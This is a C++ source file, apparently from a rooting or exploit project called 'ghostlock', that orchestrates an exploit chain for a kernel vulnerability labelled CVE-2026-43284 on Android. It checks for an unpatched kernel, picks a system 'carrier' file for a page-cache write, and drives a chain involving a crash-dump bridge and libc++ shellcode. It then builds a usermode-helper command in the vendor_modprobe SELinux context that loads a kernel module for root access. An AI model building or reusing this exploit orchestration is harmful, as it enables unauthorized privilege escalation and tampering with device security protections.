/* CVE-2026-43284 backend -> umh_forward bridge (B5-7) -- implementation.
 *
 * Pure orchestration over injected ops: no fork, no exec, no file write and no
 * device probe. See backend_terminal.hpp for the contract and the fail-closed
 * rules. The real device bindings land in B5-8/B5-9. */

#include "backend/cve_2026_43284/backend_terminal.hpp"

#include "backend/cve_2026_43284/schema.hpp"
#include "backend/cve_2026_43284_backend.hpp"
#include "backend/cve_2026_43284/steps/steps.hpp"
#include "profile/document.hpp"
#include "profile/schema.hpp"

#include <cstddef>
#include <cstdio>
#include <new>

namespace ghostlock::backend::cve_2026_43284 {

    bool resolve_carrier_token(std::uint64_t token,
                               const steps::CarrierTarget *&primary,
                               std::size_t &primary_count) noexcept {
        primary = nullptr;
        primary_count = 0U;
        if (token == kCarrierTokenDefault) {
            return true;
        }
        if (token >= kCarrierTokenLibbinderdebug && token <= kCarrierTokenMax) {
            const std::size_t index =
                    static_cast<std::size_t>(token - kCarrierTokenLibbinderdebug);
            primary = &steps::kDefaultCarriers[index];
            primary_count = 1U;
            return true;
        }
        return false;
    }

    bool select_single_carrier(std::optional<std::uint64_t> token,
                               const platform::DeviceProbeOps &device,
                               const steps::CarrierTarget *&out) noexcept {
        out = nullptr;
        const std::uint64_t value = token.value_or(kCarrierTokenDefault);
        if (value != kCarrierTokenDefault) {
            const steps::CarrierTarget *primary = nullptr;
            std::size_t count = 0U;
            if (!resolve_carrier_token(value, primary, count) || primary == nullptr ||
                count != 1U) {
                return false;
            }
            out = primary;
            return true;
        }
        /* token 0 / absent: prefer the first default the device probe reports
         * present. When the probe cannot confirm any of them, fall back to the
         * first default instead of failing: the probe is a plain stat()/access()
         * and is denied for privileged domains on some devices (the Shizuku shell
         * domain cannot getattr vendor files here), while the chain can still
         * reach such a carrier through the crash-dump bridge bound by patch #1.
         * The chain itself fails closed if the chosen carrier turns out to be
         * unusable, so an unconfirmed choice cannot silently write elsewhere. */
        if (device.file_fact != nullptr) {
            for (const steps::CarrierTarget &candidate : steps::kDefaultCarriers) {
                char path[steps::kCarrierPathMaxBytes] = {};
                const std::size_t n = candidate.path.size() < sizeof(path) - 1U
                                              ? candidate.path.size()
                                              : sizeof(path) - 1U;
                for (std::size_t i = 0U; i < n; ++i) {
                    path[i] = candidate.path[i];
                }
                platform::FileFact fact{};
                if (device.file_fact(device.ctx, path, fact) && fact.exists) {
                    out = &candidate;
                    return true;
                }
            }
        }
        out = &steps::kDefaultCarriers[0];
        return true;
    }

    BackendTerminalResult run_backend_terminal(const Cve2026_43284Profile &profile,
                                               const terminal::RootProgram &root_program,
                                               const IpsecSaParams &sa,
                                               const BackendTerminalDeps &deps,
                                               bool force_attack,
                                               terminal::UmhForwardInput &out) noexcept {
        BackendTerminalResult result{};
        /* The forced-test switch never bypasses a fail-closed device fact. */
        (void)force_attack;

        if (!profile.steps.has_value() ||
            profile.steps.value() != steps::PageCacheWriteSteps::id) {
            result.error = BackendTerminalError::StepsMismatch;
            return result;
        }
        /* The SELinux exec context is an optional profile token whose 0 value is
         * the standard vendor_modprobe domain (also the embedded libc++ hook's
         * default binding), so an absent token resolves to it instead of failing
         * the run: the production path the App drives does not need to spell out
         * the default. Any other out-of-range value is still rejected. */
        const std::uint64_t selinux_token = profile.selinux_exec_context.value_or(
                static_cast<std::uint64_t>(lkm::kSelinuxExecContextVendorModprobe));
        if (selinux_token > static_cast<std::uint64_t>(lkm::kSelinuxExecContextMax)) {
            result.error = BackendTerminalError::ProfileIncomplete;
            return result;
        }
        const std::uint32_t selinux_context = static_cast<std::uint32_t>(selinux_token);

        platform::DeviceFacts facts{};
        result.fact_error = platform::collect_device_facts(deps.device, facts);
        if (result.fact_error != platform::DeviceFactError::None) {
            result.error = result.fact_error == platform::DeviceFactError::Unavailable
                                   ? BackendTerminalError::DeviceFactsUnavailable
                                   : BackendTerminalError::DeviceFactsIncomplete;
            return result;
        }
        if (facts.has_f4c50a4) {
            result.error = BackendTerminalError::PatchedKernel;
            return result;
        }

        lkm::LkmPolicyInput policy_input{};
        policy_input.facts.release = facts.release.view();
        policy_input.facts.has_f4c50a4 = facts.has_f4c50a4;
        policy_input.profile_kmi = profile.kmi;
        policy_input.lkm_path_token = profile.lkm_path;
        policy_input.late_load_args_token = profile.late_load_args;
        lkm::LkmSelection selection{};
        if (!lkm::resolve_lkm_selection(policy_input, selection, result.lkm_error)) {
            result.error = BackendTerminalError::LkmPolicyRejected;
            return result;
        }
        if (selection.kmi == nullptr) {
            result.error = BackendTerminalError::LkmPolicyRejected;
            return result;
        }

        const std::string_view package = lkm::default_root_package(root_program.kind);
        lkm::UmhCommand command{};
        if (!lkm::build_late_load_command(root_program, package,
                                          selection.late_load_args, selinux_context,
                                          command, result.command_error)) {
            result.error = BackendTerminalError::UmhCommandRejected;
            return result;
        }

        /* Single-candidate carrier (B6/T5): the composition root selected and
         * bound exactly one candidate; the chain is given that one and never
         * falls back, so the page-cache write target, the crash_dump read bridge
         * and the libc++ shellcode ko_target all name the same file. */
        if (deps.carrier == nullptr || deps.carrier->path.empty()) {
            result.error = BackendTerminalError::CarrierRejected;
            return result;
        }
        steps::CarrierList carriers{};
        carriers.items[0] = *deps.carrier;
        carriers.count = 1U;

        if (deps.precheck_lkm != nullptr && !deps.lkm_image_path.empty()) {
            /* B5-9h-3: the precheck now needs the full VERMAGIC_STRING inputs.
             * preempt comes from /proc/version; modversions/module_force_unload
             * keep the audited-target defaults (not probeable unprivileged). */
            lkm::DeviceKernelFacts required{};
            required.release = facts.release.view();
            required.has_f4c50a4 = facts.has_f4c50a4;
            required.preempt = lkm::proc_version_has_preempt(facts.proc_version.view());
            lkm::ModuleFacts module_facts{};
            if (!deps.precheck_lkm(deps.precheck_ctx, deps.lkm_image_path, required,
                                   module_facts, result.image_error)) {
                result.error = BackendTerminalError::LkmPrecheckRejected;
                return result;
            }
        }

        steps::ChainRequest request{};
        request.carriers = carriers.items.data();
        request.carrier_count = carriers.count;
        request.wait_timeout_ms = deps.wait_timeout_ms;
        /* Target size from the composition root's fstat(2) of the same carrier
         * fd; 0 == unknown keeps the carrier's declared size authoritative. */
        request.target_size = deps.target_size;
        /* The composition root's module write plan. A null plan leaves the
         * request plan empty, which validate_plan_closure() rejects before any
         * patch #1 / hook / trigger, so a missing module fails closed. */
        if (deps.plan != nullptr) {
            request.plan = *deps.plan;
        }
        steps::ChainWorkspace workspace{};
        result.chain = steps::run_chain(request, deps.chain, workspace);
        if (result.chain.error != steps::ChainError::None || !result.chain.lkm_loaded) {
            result.error = BackendTerminalError::ChainRejected;
            return result;
        }

        out.root_program = root_program;
        out.lkm_loaded = true;
        out.lkm_source = selection.source == lkm::LkmSource::BundledKmi
                                 ? terminal::UmhLkmSource::BundledKmi
                                 : terminal::UmhLkmSource::CustomFile;
        out.set_kmi_label(selection.kmi->label);
        out.command = command;
        if (result.chain.carrier != nullptr) {
            out.set_carrier_path(result.chain.carrier->path);
        }
        out.session_secrets = &sa;
        out.session_secrets_size = sizeof(IpsecSaParams);
        out.channel = deps.umh_channel;
        /* chain.carrier points into the local carrier list; do not leak it. */
        result.chain.carrier = nullptr;
        result.ready = true;
        return result;
    }

    Cve2026_43284State &cve_2026_43284_state(session::CoreSession &state) noexcept {
        return *std::launder(reinterpret_cast<Cve2026_43284State *>(state.backend_state));
    }

    const Cve2026_43284State &cve_2026_43284_state(
            const session::CoreSession &state) noexcept {
        return *std::launder(
                reinterpret_cast<const Cve2026_43284State *>(state.backend_state));
    }

    void cve_2026_43284_state_construct(session::CoreSession &state) noexcept {
        if (state.backend_state_ready) {
            return;
        }
        std::construct_at(reinterpret_cast<Cve2026_43284State *>(state.backend_state));
        state.backend_state_ready = true;
        state.backend_state_dtor = [](void *raw) noexcept {
            auto *typed = static_cast<Cve2026_43284State *>(raw);
            zeroize(typed->sa);
            typed->~Cve2026_43284State();
        };
    }

    void cve_2026_43284_state_destroy(session::CoreSession &state) noexcept {
        if (!state.backend_state_ready) {
            return;
        }
        if (state.backend_state_dtor != nullptr) {
            state.backend_state_dtor(state.backend_state);
            state.backend_state_dtor = nullptr;
        }
        state.backend_state_ready = false;
    }

} // namespace ghostlock::backend::cve_2026_43284

namespace ghostlock::backend {
    using ghostlock::session::CoreSession;
    using ghostlock::contract::StageResult;

    profile::BindStatus Cve2026_43284Policy::state_from(
            CoreSession &session, const profile::Document &document) {
        profile::Document owned;
        owned.release = document.release;
        owned.terminal = document.terminal;
        owned.backend = document.backend;
        owned.middleware = document.middleware;
        for (const profile::Section &section : document.sections) {
            if (section.name == kCve2026_43284Section) owned.sections.push_back(section);
        }
        Cve2026_43284Profile view{};
        const profile::BindStatus status = profile::bind<Cve2026_43284Schema>(
                owned, view, profile::DecodeMode::Production);
        if (!status.ok()) return status;
        cve_2026_43284::cve_2026_43284_state(session).profile = view;
        return status;
    }

    StageResult Cve2026_43284Policy::run(CoreSession &session,
                                         const char *debug_dir, bool force_attack,
                                         ghostlock::terminal::UmhForwardInput &out) {
        (void)debug_dir;
        cve_2026_43284::Cve2026_43284State &state =
                cve_2026_43284::cve_2026_43284_state(session);
        const cve_2026_43284::BackendTerminalResult result =
                cve_2026_43284::run_backend_terminal(state.profile, state.root_program,
                                                    state.sa, state.deps, force_attack, out);
        if (!result.ready) {
            /* A silent Failed leaves the App with no diagnosis; name the reason. */
            (void)std::fprintf(stderr,
                               "cve_2026_43284 backend failed: error=%d fact_error=%d "
                               "lkm_error=%d image_error=%d\n",
                               static_cast<int>(result.error),
                               static_cast<int>(result.fact_error),
                               static_cast<int>(result.lkm_error),
                               static_cast<int>(result.image_error));
            (void)std::fflush(stderr);
        }
        return result.ready ? StageResult::Continue : StageResult::Failed;
    }
} // namespace ghostlock::backend
